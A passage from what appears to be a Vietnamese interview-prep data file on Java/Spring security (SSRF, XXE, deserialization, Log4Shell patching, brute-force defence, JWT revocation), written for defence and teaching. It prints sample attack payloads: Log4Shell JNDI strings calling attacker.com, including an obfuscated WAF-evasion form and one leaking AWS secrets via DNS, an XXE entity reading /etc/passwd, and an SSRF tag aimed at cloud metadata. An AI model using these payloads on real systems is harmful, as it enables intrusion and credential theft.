> Senior tip: **Ngân hàng thường yêu cầu digital signature** cho giao dịch chuyển tiền, mở tài khoản — non-repudiation thường là yêu cầu pháp lý/hợp đồng với đối tác. Internal service dùng HMAC cho performance. Luôn canonicalize payload (sorted keys, no whitespace) trước khi sign. Key rotation: HMAC secret rotate 90 ngày, signing cert rotate 1-2 năm. Log tất cả verify failed (potential attack).`,
  follow: [
    'HMAC vs Digital Signature: khi nào dùng cái nào cho open banking API?',
    'Canonicalization payload JSON như thế nào để deterministic (key order, whitespace)?',
    'Làm sao handle clock skew giữa client/server khi verify timestamp?'
  ],
  tags: ['HMAC', 'Digital Signature', 'Non-repudiation', 'Replay Attack', 'Timestamp', 'Nonce', 'RSA-PSS', 'ECDSA']
},
{
  id: 'security-012',
  topic: 'security',
  level: 'senior',
  q: 'SSRF, XXE và insecure deserialization trong Java: cấu hình parser XML an toàn, chặn gọi URL nội bộ. Các vector tấn công thực tế?',
  a: `**Tóm tắt:** **SSRF** (Server-Side Request Forgery): attacker khiến server gọi URL nội bộ (metadata cloud, localhost, private IP). **XXE** (XML External Entity): parser XML resolve external entity → đọc file, SSRF, DoS. **Insecure Deserialization**: Java deserialize untrusted data → gadget chain → RCE. Phòng thủ: whitelist outbound, disable external entity, disable deserialization hoặc dùng ObjectInputFilter.

### SSRF (Server-Side Request Forgery)
- Vector: API fetch URL từ user input (webhook, avatar URL, document import, PDF generator).
- Target: {{http://169.254.169.254}} (AWS metadata), {{http://localhost:8080}}, {{http://127.0.0.1}}, private IP ranges, internal services.
- Impact: credential theft (IAM role), internal service enumeration, RCE via internal admin panel.

~~~java
// ❌ NGUY HIỂM
public String fetchUrl(String url) {
    return new RestTemplate().getForObject(url, String.class);
}

// ✅ AN TOÀN HƠN — allowlist host + chặn IP nội bộ cho MỌI địa chỉ DNS trả về
private static final Set<String> ALLOWED_HOSTS = Set.of("partner.example.com");

public String fetchUrlSafe(String url) throws IOException {
    URI uri = URI.create(url);
    if (!"https".equals(uri.getScheme())) throw new SecurityException("Chỉ cho phép HTTPS");
    if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new SecurityException("Host không nằm trong allowlist");
    for (InetAddress a : InetAddress.getAllByName(uri.getHost())) {
        if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress() // 169.254.x = metadata
                || a.isAnyLocalAddress() || a.isMulticastAddress()) {
            throw new SecurityException("IP nội bộ bị chặn: " + a);
        }
        // isSiteLocalAddress() không bao IPv6 ULA fc00::/7, 100.64/10… — cần tự kiểm thêm
    }
    // Client phải: TẮT follow redirect, đặt timeout, giới hạn size response,
    // và kết nối tới đúng IP vừa kiểm (chống DNS rebinding)
    return restClient.get().uri(uri).retrieve().body(String.class);
}
~~~
Trên AWS, bật **IMDSv2** (bắt buộc token PUT, hop limit 1) để SSRF kiểu GET đơn giản không lấy được credential từ metadata.

### XXE (XML External Entity) — Parser XML
- Payload: {{<!ENTITY xxe SYSTEM "file:///etc/passwd">}} → đọc file local.
- Parameter entity + FTP/HTTP → SSRF.
- Billion laughs (entity expansion) → DoS.

~~~java
// ❌ NGUY HIỂM — cấu hình mặc định của JDK vẫn xử lý DTD và external entity
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(input);

// ✅ AN TOÀN — cấm DOCTYPE (chặn cả XXE lẫn billion laughs)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Nếu bắt buộc cho phép DOCTYPE thì ít nhất tắt các feature sau:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(input);
~~~
Các parser khác cũng phải cấu hình riêng: {{SAXParserFactory}}, {{XMLInputFactory}} (StAX: {{SUPPORT_DTD=false}}), {{TransformerFactory}}/{{SchemaFactory}} ({{XMLConstants.ACCESS_EXTERNAL_DTD}} = chuỗi rỗng), Jackson XML.

### Insecure Deserialization — Java Gadget Chain
- {{ObjectInputStream.readObject()}} trên data không tin cậy → RCE (CommonsCollections, Spring, ROME gadgets).
- Deserialize xảy ra **trước** validation business logic.
- Vector: RMI, JMS, HTTP (session, viewstate), file upload, cache (Redis/Java serialization).

~~~java
// ✅ AN TOÀN — ObjectInputFilter (JEP 290, Java 9+)
// Allowlist + giới hạn tài nguyên, class ngoài danh sách bị từ chối (!*)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxrefs=10000;maxbytes=1048576;com.myapp.dto.*;java.lang.*;java.util.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
// Hoặc system-wide: -Djdk.serialFilter=... (cùng cú pháp)

// Jackson: KHÔNG bật default typing / @JsonTypeInfo(use = CLASS) cho dữ liệu
// không tin cậy — đó chính là cửa cho gadget chain. Nếu bắt buộc polymorphic:
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.myapp.dto.") // allowlist package
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
~~~

### Pitfall thực tế
- **PDF generator** (wkhtmltopdf, headless Chrome) render HTML từ user → SSRF qua {{<img src="http://169.254.169.254">}}.
- **SAML/XML** parsing không disable external entity → XXE.
- **Java serialization** trong Redis session / RMI → deserialization RCE.
- **Log4Shell** (CVE-2021-44228) — bản chất là **JNDI injection**: lookup trong log message khiến app kết nối LDAP/RMI của attacker, nhận về class/object độc → RCE.

> Senior tip: **Mặc định deny all outbound** — chỉ whitelist domain/IP partner. Dùng egress proxy (Envoy, Squid) enforce policy. XML parser: set feature {{disallow-doctype-decl=true}} ngay khi init. Deserialization: {{ObjectInputFilter}} (JEP 290; Java 17 có thêm filter factory theo context — JEP 415), tốt nhất là không deserialize Java native từ nguồn không tin cậy. Log4Shell: upgrade Log4j 2.17.1+ (Java 8) — từ 2.16.0 JNDI bị tắt mặc định và message lookup bị gỡ; {{log4j2.formatMsgNoLookups=true}} chỉ là biện pháp tạm và **không đủ** (bị bypass, CVE-2021-45046).`,
  follow: [
    'SSRF bypass qua DNS rebinding / TOCTOU — cách phòng thủ?',
    'XXE qua parameter entity (blind XXE) exploit thế nào?',
    'Java {{ObjectInputFilter}} pattern matching syntax như thế nào? Whitelist vs blacklist?'
  ],
  tags: ['SSRF', 'XXE', 'Insecure Deserialization', 'ObjectInputFilter', 'XML Parser', 'Gadget Chain', 'Log4Shell']
},
{
  id: 'security-013',
  topic: 'security',
  level: 'lead',
  q: 'Lỗ hổng thư viện (Log4Shell CVE-2021-44228): SCA, SBOM, quy trình vá khẩn trong ngân hàng. Phân tích root cause và lessons learned?',
  a: `**Tóm tắt:** **Log4Shell** (CVE-2021-44228, CVSS 10.0) — JNDI lookup trong Log4j 2.x khi log message chứa payload JNDI → RCE. Root cause: **message lookup substitution** feature cho phép JNDI lookup không bị restrict. Lessons: SCA (Software Composition Analysis) bắt buộc trong CI/CD, SBOM (Software Bill of Materials) để biết dependency tree, quy trình vá khẩn 24-72h cho critical CVE, defense-in-depth (WAF, egress firewall, runtime protection).

### Root Cause Analysis
- Log4j 2.0-beta9 đến 2.14.1: {{MessagePatternConverter}} xử lý
~~~text
\${prefix:name}
~~~
→ {{StrSubstitutor}} resolve.
- {{jndi:}} prefix trigger {{JndiLookup}} → {{JndiManager.lookup()}} → connect đến LDAP/RMI server attacker → server trả về Reference trỏ tới class remote (JDK cũ cho tải class từ codebase URL) hoặc serialized object khai thác gadget có sẵn trong classpath → RCE.
- Kể cả khi không RCE được, lookup như {{env:}} lồng trong {{jndi:ldap}} / DNS vẫn làm **rò rỉ secret** (biến môi trường) ra ngoài.
- Bất kỳ data nào attacker kiểm soát mà được log (header, parameter, body, username) đều trigger — kể cả log kiểu parameterized.

### Payload JNDI mẫu
~~~text
\${jndi:ldap://attacker.com:1389/Exploit}
\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://attacker.com/x}   # obfuscated, né WAF
\${jndi:ldap://\${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}                     # rò rỉ secret qua DNS
# Trigger: log.info("User-Agent: " + userAgent);
# Kể cả log.info("User-Agent: {}", userAgent) cũng dính (2.0-beta9 → 2.14.1)
~~~

### SCA (Software Composition Analysis) — Phát hiện sớm
- **Tools**: OWASP Dependency-Check, Snyk, Sonatype OSS Index, GitHub Dependabot, Trivy, Grype.
- **CI/CD Integration**: fail build nếu critical/high CVE trong dependency (block merge).
- **Transitive dependency**: SCA quét toàn bộ dependency tree, không chỉ direct.
- **Policy**: critical CVE → block deploy, 24h remediation; high → 72h.

### SBOM (Software Bill of Materials) — Biết mình có gì
- Format: **SPDX** (Software Package Data Exchange), **CycloneDX** (OWASP).
- Chứa: component name, version, supplier, hash, license, CVE mapping.
- Generate tại build time: {{mvn cyclonedx:makeAggregateBom}}, {{syft dir:. -o cyclonedx-json}}.
- Sử dụng: quick impact assessment khi CVE mới xuất hiện (grep SBOM cho {{log4j-core}}).

### Quy trình vá khẩn trong ngân hàng (Critical CVE)
| Giai đoạn | Thời gian | Hành động |
|---|---|---|
| **Detect** | T+0 | SCA alert / CVE publish / Threat intel feed |
| **Triage** | T+1h | Security team confirm affected, assess exploitability |
| **Contain** | T+2h | WAF rule chặn chuỗi lookup chứa {{jndi:}}, egress firewall block outbound LDAP/RMI; nếu chưa upgrade kịp: xoá class {{JndiLookup}} khỏi jar {{log4j-core}} (biện pháp tạm được Apache khuyến nghị) |
| **Patch** | T+24h | Upgrade log4j-core 2.17.1+ (Java 8; 2.12.4 cho Java 7, 2.3.2 cho Java 6), rebuild, test, deploy canary |
| **Verify** | T+48h | Scan lại, penetration test, confirm fix |
| **Report** | T+72h | Báo cáo CISO/Regulator, update SBOM, lessons learned |

### Defense-in-depth (không chỉ patch)
- **WAF**: rule chặn chuỗi lookup chứa {{jndi:}} và dạng lookup lồng nhau trong header/body — chỉ là lớp tạm, payload obfuscate có thể vượt qua.
- **Egress firewall**: block outbound LDAP (389), RMI (1099), DNS to unknown.
- **Runtime protection**: Java agent (Contrast, Datadog) detect JNDI lookup.
- **Logging hygiene**: không log raw user input, sanitize trước khi log.

> Senior tip: **Log4Shell là wake-up call cho supply chain security**. Nên đặt thành chuẩn nội bộ: SBOM cho mọi release, SCA gate trong CI/CD, SLA vá critical CVE (ví dụ 24–72h), WAF managed rule tự cập nhật. Không chỉ Log4j — tương tự Spring4Shell (CVE-2022-22965), Jackson gadget. Bài học lớn nhất: **biết ngay mình đang chạy version nào ở đâu** (SBOM + inventory) và có pipeline đủ nhanh để rebuild/redeploy toàn bộ service trong vài giờ.`,
  follow: [
    'Log4j 2.15.0 fix ban đầu bị bypass như thế nào (CVE-2021-45046)?',
    'SBOM CycloneDX vs SPDX — chọn cái nào cho compliance ngân hàng VN?',
    'Làm sao detect Log4Shell exploit attempt trong production log real-time?'
  ],
  tags: ['Log4Shell', 'CVE-2021-44228', 'SCA', 'SBOM', 'Supply Chain Security', 'Vulnerability Management', 'JNDI'],
  refs: [
    { type: 'doc', title: 'OWASP Top 10', url: 'https://owasp.org/Top10/' },
    { type: 'doc', title: 'OWASP Cheat Sheet Series', url: 'https://cheatsheetseries.owasp.org/' },
  ],
},
{
  id: 'security-014',
  topic: 'security',
  level: 'senior',
  q: 'Chống brute force đăng nhập: rate limit theo user/IP, khóa tạm, CAPTCHA, phát hiện credential stuffing. Cách implement production-ready?',
  a: `**Tóm tắt:** **Layered defense**: rate limit per IP + per user (sliding window), account lockout tăng dần (exponential backoff), CAPTCHA sau N lần fail, device fingerprint + behavioral analysis cho credential stuffing. Spring Boot: {{Bucket4j}} / {{Resilience4j}} rate limiter, Redis lưu counter, {{PwnedPasswords}} check password bị leak.

### Rate Limiting Strategy
| Layer | Scope | Algorithm | Config ví dụ |
|---|---|---|---|
| **Network/WAF** | IP | Token bucket | 100 req/min/IP, burst 20 |
| **Application** | IP + User | Sliding window log | 5 req/15min/IP, 10 req/15min/user |
| **Login endpoint** | User | Fixed window + exponential backoff | 5 fail → lock 15m, 10 fail → lock 1h, 20 fail → lock 24h |

### Account Lockout — Exponential Backoff
- Fail 1-4: không lock, chỉ rate limit.
- Fail 5: lock 15 phút.
- Fail 10: lock 1 giờ.
- Fail 20: lock 24 giờ, yêu cầu MFA reset qua email/SMS.
- Unlock: tự động sau timeout, hoặc admin unlock, hoặc user self-service qua link email.

~~~java
// Redis-based rate limiter + lockout
@Service
@RequiredArgsConstructor
public class LoginProtectionService {
    private final RedisTemplate<String, String> redis;
    private static final int MAX_ATTEMPTS = 5;
    private static final int WINDOW_MINUTES = 15;

    public void recordFailedAttempt(String username, String ip) {
        // Đếm theo USER (không gộp với IP — botnet đổi IP liên tục) và đếm riêng theo IP
        String key = "login:fail:user:" + username;
        Long count = redis.opsForValue().increment(key);
        if (count == 1) redis.expire(key, Duration.ofMinutes(WINDOW_MINUTES)); // nên gộp atomic bằng Lua
        Long ipCount = redis.opsForValue().increment("login:fail:ip:" + ip); // dùng cho rate limit/CAPTCHA theo IP

        if (count >= MAX_ATTEMPTS) {
            lockAccount(username, calculateLockDuration(count));
        }
    }

    private void lockAccount(String username, Duration duration) {
        String lockKey = "login:lock:" + username;
        redis.opsForValue().set(lockKey, "LOCKED", duration);
        // Audit log
        auditLog.warn("Account locked: user={}, duration={}", username, duration);
    }

    public boolean isLocked(String username) {
        return Boolean.TRUE.equals(redis.hasKey("login:lock:" + username));
    }
}
~~~

### CAPTCHA — Human Verification
- Trigger: sau 3-5 lần fail, hoặc score risk cao (new device, new geo, VPN/Tor).
- Provider: **hCaptcha** (privacy-friendly), **reCAPTCHA v3** (invisible, score-based), **Turnstile** (Cloudflare).
- Accessibility: cung cấp audio challenge, fallback cho screen reader.

### Credential Stuffing Detection
- **Dữ liệu**: danh sách credential bị leak (Have I Been Pwned, internal breach DB).
- **Kiểm tra**: registration/password change → check PwnedPasswords API (k-anonymity model, chỉ gửi 5 char đầu SHA-1).
- **Behavioral**: device fingerprint (canvas, font, timezone), IP reputation (AbuseIPDB), impossible travel (login từ 2 quốc gia trong 1h), user agent anomaly.
- **Response**: force MFA, step-up authentication, notify user, temporary lock.

~~~java
// PwnedPasswords check (k-anonymity)
public boolean isPwned(String password) {
    String sha1 = sha1(password).toUpperCase();
    String prefix = sha1.substring(0, 5);
    String suffix = sha1.substring(5);
    String response = webClient.get().uri("https://api.pwnedpasswords.com/range/" + prefix)
        .retrieve().bodyToMono(String.class).block();
    return Arrays.stream(response.split("\\r?\\n"))
        .anyMatch(line -> line.startsWith(suffix));
}
~~~

### Monitoring & Alerting
- Metrics: {{login.failure.rate}}, {{login.lockout.count}}, {{captcha.challenge.rate}}, {{credential.stuffing.detected}}.
- Alert: spike failure rate > 5x baseline, lockout > 100 accounts/15m, new geo login for admin.
- Dashboard: real-time login heatmap (geo, device, outcome).

> Senior tip: **Không chỉ rate limit IP** — attacker dùng botnet (nghìn IP). Rate limit per **user** là quan trọng hơn. Lockout phải có **exponential backoff** để không DoS legitimate user. Luôn check **PwnedPasswords** khi đăng ký/đổi pass (NIST SP 800-63B khuyến nghị đối chiếu danh sách mật khẩu đã lộ). Để ngưỡng CAPTCHA/lockout trong config động (feature flag, config server) để chỉnh nhanh khi đang bị tấn công, không cần deploy. Trả cùng một thông báo lỗi cho "sai user" và "sai mật khẩu" để chống dò username. Với ngân hàng: bắt buộc MFA cho mọi login, device registration (trusted device bypass CAPTCHA).`,
  follow: [
    'Rate limit sliding window vs fixed window vs token bucket — khác nhau như thế nào cho login?',
    'Credential stuffing vs password spraying — khác nhau ở đâu, detect như thế nào?',
    'Làm sao balance UX (ít friction) vs security (chống brute force) cho user hợp pháp?'
  ],
  tags: ['Brute Force', 'Rate Limiting', 'Account Lockout', 'CAPTCHA', 'Credential Stuffing', 'PwnedPasswords', 'Redis', 'MFA']
},
{
  id: 'security-015',
  topic: 'security',
  level: 'mid',
  q: 'Spring Security 6: cấu hình SecurityFilterChain bằng lambda DSL thế nào? Khi nào cần nhiều filter chain, thứ tự ra sao và các bẫy thường gặp?',
  a: `**Tóm tắt:** Từ Spring Security 6, mỗi nhóm endpoint được bảo vệ bởi một bean {{SecurityFilterChain}} dựng theo **lambda DSL**. Khi bạn tự khai báo bean này, Spring Boot **tắt** cấu hình bảo mật mặc định, nên bạn phải khai báo đầy đủ mọi rule. Hệ thống lớn nên tách nhiều chain theo {{securityMatcher()}} và {{@Order}}; chain nào khớp **đầu tiên** sẽ xử lý request.

### Vì sao dùng lambda DSL
- DSL cũ nối bằng {{and()}} khó đọc. Lịch sử API: Spring Security 6.0 xoá hẳn {{antMatchers()}}/{{mvcMatchers()}}/{{regexMatchers()}} (thay bằng {{requestMatchers()}}) và đánh dấu {{authorizeRequests()}} deprecated; 7.0 xoá nốt cả {{authorizeRequests()}} và {{and()}}. Lambda DSL vốn có từ 5.2.
- Cách viết {{http.csrf(c -> c.disable())}} là **type-safe**: IDE gợi ý đúng method của từng phần, không phải nhớ API trả về {{HttpSecurity}}.

### Nhiều chain và thứ tự
- {{securityMatcher(...)}} đặt ở **cấp chain**: request không khớp thì Spring thử chain tiếp theo. Không có matcher nghĩa là chain đó nhận **mọi** request.
- {{@Order}} nhỏ hơn chạy trước. Không đặt order thì chain rơi vào cuối, rất dễ bị chain phía trên "nuốt" mất.
- Tách chain hợp lý: API stateless cho mobile/SPA, chain form-login cho trang quản trị nội bộ, chain riêng cho actuator.

~~~java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    @Order(1)
    SecurityFilterChain apiChain(HttpSecurity http) throws Exception {
        return http
            .securityMatcher("/api/**")
            .csrf(AbstractHttpConfigurer::disable)              // API không dùng cookie session
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(a -> a
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().hasAuthority("SCOPE_read"))
            .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
            .exceptionHandling(e -> e.authenticationEntryPoint(
                new BearerTokenAuthenticationEntryPoint()))     // 401 kèm WWW-Authenticate
            .build();
    }

    @Bean
    @Order(2)
    SecurityFilterChain webChain(HttpSecurity http) throws Exception {
        return http
            .authorizeHttpRequests(a -> a
                .requestMatchers("/login", "/css/**").permitAll()
                .anyRequest().authenticated())
            .formLogin(Customizer.withDefaults())
            .build();
    }
}
~~~

### CORS, CSRF và mã lỗi
- **CORS**: nếu có bean {{CorsConfigurationSource}}, hãy gọi {{http.cors(Customizer.withDefaults())}}. Thiếu bước này, preflight {{OPTIONS}} có thể bị chặn với 401 trước khi tới controller.
- **CSRF**: chain dùng cookie/session phải giữ CSRF. API stateless xác thực bằng header {{Authorization}} thì tắt được. SPA dùng cookie có thể dùng {{CookieCsrfTokenRepository.withHttpOnlyFalse()}} và gửi token qua header.
- **401 vs 403**: chưa xác thực → {{AuthenticationEntryPoint}} trả 401; đã xác thực nhưng thiếu quyền → {{AccessDeniedHandler}} trả 403. Đừng trả 500 cho hai trường hợp này.

### Bẫy production
- Viết {{anyRequest().permitAll()}} để "chạy được trước" rồi quên — đây là lỗi cấu hình bảo mật phổ biến nhất.
- Chain không có {{securityMatcher}} đứng trước khiến các chain sau không bao giờ chạy.
- Quên siết actuator: chỉ mở {{/actuator/health}}, còn {{env}}, {{heapdump}}, {{beans}} phải chặn hoặc đặt sau quyền admin.
- {{permitAll()}} không có nghĩa là bỏ qua toàn bộ filter; nó chỉ bỏ qua bước **authorization**, các filter khác vẫn chạy.
- Method security là lớp riêng: URL rule không bảo vệ lời gọi nội bộ giữa các service.

> Senior tip: hãy viết test âm tính cho **từng chain**: không token → 401, token sai scope → 403, token đúng → 200, và kiểm tra actuator. Dùng {{MockMvc}} + {{spring-security-test}} ({{jwt()}}, {{@WithMockUser}}). Khi điều tra trên môi trường thật, bật {{logging.level.org.springframework.security=DEBUG}} để thấy filter nào chặn request; nhớ tắt lại vì log có thể chứa thông tin nhạy cảm. Nguyên tắc thiết kế: **deny by default**, mỗi endpoint mới phải được thêm rule một cách có ý thức.`,
  follow: [
    'Vì sao chain không có securityMatcher lại có thể vô hiệu hoá các chain phía sau?',
    'Khi nào nên tách nhiều SecurityFilterChain thay vì dùng một chain với requestMatchers?',
    'Làm sao trả lỗi 401/403 dạng JSON thống nhất cho cả REST API và trang web?'
  ],
  tags: ['Spring Security 6', 'SecurityFilterChain', 'lambda DSL', 'CORS', 'CSRF', 'authorization']
},
{
  id: 'security-016',
  topic: 'security',
  level: 'mid',
  q: 'Mass assignment (over-posting) là gì? Vì sao bind JSON trực tiếp vào entity nguy hiểm, và cách chặn bằng DTO/record trong Spring Boot?',
  a: `**Tóm tắt:** Mass assignment xảy ra khi ứng dụng **bind toàn bộ field từ request vào entity** thay vì chỉ những field được phép. Attacker thêm {{role: ADMIN}}, {{balance: 999999}}, {{ownerId: 1}} hoặc {{enabled: true}} vào JSON và ghi đè dữ liệu mà business không hề cho phép. Cách chặn chuẩn là dùng **DTO/record allowlist**, mapping tường minh, và luôn lấy danh tính/tenant từ principal chứ không từ body.

### Vì sao lỗi này phổ biến
- Spring Boot đặt Jackson ở chế độ bỏ qua property lạ ({{FAIL_ON_UNKNOWN_PROPERTIES=false}}). Điều này giúp API tiến hoá dễ, nhưng field **có thật trên entity** vẫn được bind bình thường.
- Viết {{@PostMapping public User update(@RequestBody User user)}} là mở cửa: mọi setter public của {{User}} đều là bề mặt tấn công.
- Form binding {{@ModelAttribute Account account}} cũng vậy qua {{WebDataBinder}}; field không hiện trên form vẫn có thể được gửi thêm.

~~~json
// Request hợp lệ của client
{ "fullName": "Nguyen Van A", "phone": "0901234567" }

// Request của attacker gửi thêm field nhạy cảm
{ "fullName": "Nguyen Van A", "phone": "0901234567",
  "role": "ADMIN", "balance": 999999, "ownerId": 1, "status": "ACTIVE" }
~~~

### Cách chặn: DTO là allowlist
~~~java
// Chỉ những field client được phép gửi
public record UpdateProfileRequest(
        @NotBlank @Size(max = 120) String fullName,
        @Pattern(regexp = "^0[0-9]{9}$") String phone) { }

@PutMapping("/me")
public ProfileResponse update(@Valid @RequestBody UpdateProfileRequest req,
                              @AuthenticationPrincipal Jwt jwt) {
    User user = userRepo.getReferenceById(Long.valueOf(jwt.getSubject()));
    user.setFullName(req.fullName());       // mapping tường minh
    user.setPhone(req.phone());
    // role, balance, ownerId KHÔNG có trong DTO nên không thể bị ghi đè
    return mapper.toResponse(userRepo.save(user));
}
~~~

- DTO nên là {{record}} hoặc class chỉ có getter; không expose setter cho field không cho phép.
- Dùng MapStruct với {{@Mapping(target = "role", ignore = true)}} nếu map entity; luôn review mapping generated.
- Với form MVC: thêm {{@InitBinder("account")}} và gọi {{b.setAllowedFields("name", "email")}} trên {{WebDataBinder}}.
- Với field chỉ đọc như {{id}}, {{createdAt}}, có thể dùng {{@JsonProperty(access = Access.READ_ONLY)}} để Jackson không deserialize.
- Hiểu đúng {{@JsonIgnore}}: nó áp cho **cả logical property** (getter/setter/field liên kết), tức tắt luôn chiều deserialize chứ không phải chỉ ẩn field trong response. Muốn field vẫn trả ra nhưng không bind từ request, dùng đúng {{@JsonProperty(access = Access.READ_ONLY)}} như trên và viết test chứng minh.
- {{tenantId}}, {{ownerId}} phải lấy từ token/principal; nếu bắt buộc nhận từ request thì đối chiếu lại với quyền hiện tại.

### Pitfall nâng cao
- **PATCH**: nếu dùng {{Map<String,Object>}} rồi reflection set field, bạn vừa tái tạo mass assignment. Hãy whitelist key hoặc dùng DTO có {{Optional}}/patch riêng.
- **Enum/role**: attacker gửi {{role: "ADMIN"}}; nếu entity có setter nhận enum, Jackson convert được. Kiểm tra cả field lồng trong object con.
- **JPA dirty checking**: bind vào entity đang managed thì commit ghi luôn, không cần gọi save. Đây là lý do lỗi hay lọt qua test.
- **API3:2023 Broken Object Property Level Authorization**: OWASP gọi đây là lỗi ở cấp **property**, khác với BOLA/IDOR ở cấp object.
- Thêm {{@Version}} (optimistic locking) để tránh lost update khi hai request sửa cùng bản ghi.

> Senior tip: đặt rule code review "controller không bao giờ nhận entity JPA", grep {{@RequestBody}} trong CI là bắt được phần lớn. Viết test contract gửi {{"role":"ADMIN"}} và assert role **không đổi**; test này rẻ hơn nhiều so với sự cố leo thang quyền. Với API công khai, log các field bị bỏ qua ở môi trường staging để phát hiện client gửi thừa, nhưng đừng log toàn bộ body vì có PII.`,
  follow: [
    'Vì sao Spring Boot mặc định bỏ qua JSON property lạ, và trade-off với việc fail-fast là gì?',
    'Mass assignment khác IDOR/BOLA ở điểm nào theo OWASP API Security Top 10?',
    'Làm sao áp dụng allowlist khi thiết kế API PATCH chỉ cập nhật một phần field?'
  ],
  tags: ['Mass Assignment', 'Over-posting', 'DTO', 'Jackson', 'Spring Boot', 'BOPLA', 'OWASP API']
},
{
  id: 'security-017',
  topic: 'security',
  level: 'senior',
  q: 'JWT self-contained và opaque token: chọn cái nào? Thu hồi token tức thời ở quy mô lớn (logout, đổi mật khẩu, khóa tài khoản) triển khai thế nào?',
  a: `**Tóm tắt:** **JWT** tự chứa claim nên service verify offline, nhanh và không cần gọi auth server mỗi request — nhưng **khó thu hồi** vì token đã phát ra vẫn hợp lệ tới khi hết hạn. **Opaque token** chỉ là chuỗi ngẫu nhiên, mỗi request phải introspection hoặc tra store, đổi lại **thu hồi tức thời** và không lộ claim. Thực tế hay dùng **hybrid**: access token JWT ngắn hạn (5–15 phút) + refresh token opaque có rotation, kèm denylist cho các sự kiện rủi ro cao.

### So sánh
| Tiêu chí | JWT | Opaque token |
|---|---|---|
| Verify | Offline bằng public key/JWKS | Gọi introspection/store mỗi request (có cache) |
| Kích thước | Lớn (nhiều claim, có thể vài KB) | Nhỏ, cố định |
| Thu hồi | Khó, cần denylist/version | Tức thời, xoá record |
| Lộ dữ liệu | Claim chỉ **base64**, ai có token đều đọc được | Không lộ gì ngoài chuỗi |
| Phụ thuộc | Auth server chỉ lúc phát/rotate key | Auth server/store là điểm nghẽn runtime |
| Phù hợp | Nhiều service, cần scale đọc | Ít service, cần thu hồi chặt, tải thấp |

### Thu hồi JWT — các mức
1. **Giảm TTL**: access token 5–15 phút. Đây là biện pháp rẻ nhất; cửa sổ rủi ro bằng TTL.
2. **Denylist theo {{jti}}** trong Redis: khi logout/khoá tài khoản, ghi {{jti}} với TTL bằng thời gian còn lại của token. Mọi service kiểm tra Redis trước khi chấp nhận. Chi phí: thêm một lookup mỗi request.
3. **Token version/session version**: lưu {{tokenVersion}} theo user; JWT mang version; tăng version khi đổi mật khẩu/khoá → **toàn bộ** token cũ chết. Cần đọc version từ cache/DB, nên vẫn là state.
4. **Refresh token rotation + reuse detection**: mỗi refresh token chỉ dùng một lần; nếu token cũ bị dùng lại, revoke cả họ token (dấu hiệu bị đánh cắp).
5. **Key rotation**: xoá {{kid}} cũ khỏi JWKS sẽ vô hiệu token ký bằng key đó, nhưng đây là biện pháp thô, ảnh hưởng mọi user.

~~~java
// Kiểm tra denylist sau khi đã verify chữ ký + exp
public boolean isRevoked(Jwt jwt, RedisTemplate<String, String> redis) {
    String jti = jwt.getId();
    return jti != null && Boolean.TRUE.equals(redis.hasKey("jwt:deny:" + jti));
}

// Khi logout: TTL = thời gian còn lại, không giữ mãi
public void revoke(Jwt jwt, RedisTemplate<String, String> redis) {
    Duration ttl = Duration.between(Instant.now(), jwt.getExpiresAt());
    if (!ttl.isNegative() && !ttl.isZero()) {
        redis.opsForValue().set("jwt:deny:" + jwt.getId(), "1", ttl);
    }
}
~~~

### Opaque token và introspection
- Theo RFC 7662, resource server gọi introspection endpoint, nhận {{active: true/false}} cùng metadata. Có thể cache kết quả **ngắn hơn hoặc bằng** revocation SLA; không cache response lỗi.
- Token store thường là Redis/DB do auth server quản lý; logout xoá key là xong, nhưng mọi request phụ thuộc auth server/store — cần HA, timeout, circuit breaker. Scope lấy từ introspection rồi map sang authority.

### Chọn theo yêu cầu thực tế
- Nếu yêu cầu khoá tài khoản có hiệu lực **dưới 30 giây**, JWT thuần không đáp ứng khi TTL dài; dùng TTL ngắn + denylist hoặc opaque.
- Nếu có hàng chục service đọc token với lưu lượng rất cao, JWT giảm tải introspection đáng kể.
- Với thao tác rủi ro cao như chuyển tiền, yêu cầu **step-up**: token mới TTL 2–5 phút kèm MFA.

### Pitfall
- Nhét PII, số tài khoản, role nhạy cảm vào JWT — base64 không phải mã hoá. Cần giấu thì dùng JWE, nhưng cân nhắc kích thước.
- Denylist không có TTL → Redis phình to.
- Chỉ revoke access token mà quên refresh token.
- Kiểm tra denylist **sau** khi verify chữ ký; đừng tra Redis bằng dữ liệu chưa xác thực.
- Log token, đặt token vào query URL (lọt access log/referer) hoặc để cả localStorage khi còn rủi ro XSS.

> Senior tip: chốt **revocation SLA** với bên nghiệp vụ trước khi chọn kiến trúc, vì nó quyết định TTL và chi phí hạ tầng. Cấu hình thực tế hay dùng: access 10 phút, refresh 8 giờ có rotation, denylist cho logout và khoá khẩn cấp, version check cho đổi mật khẩu. Đo tỉ lệ cache hit của introspection; đặt alert khi auth server chậm, và luôn có đường fallback đọc JWKS cache khi auth server down.`,
  follow: [
    'Denylist JWT trong Redis chịu được bao nhiêu request/giây, và nút thắt nằm ở đâu?',
    'Refresh token rotation phát hiện reuse như thế nào mà không cần lưu toàn bộ token?',
    'Khi nào nên dùng DPoP hoặc mTLS-bound token thay vì bearer token thông thường?'
  ],
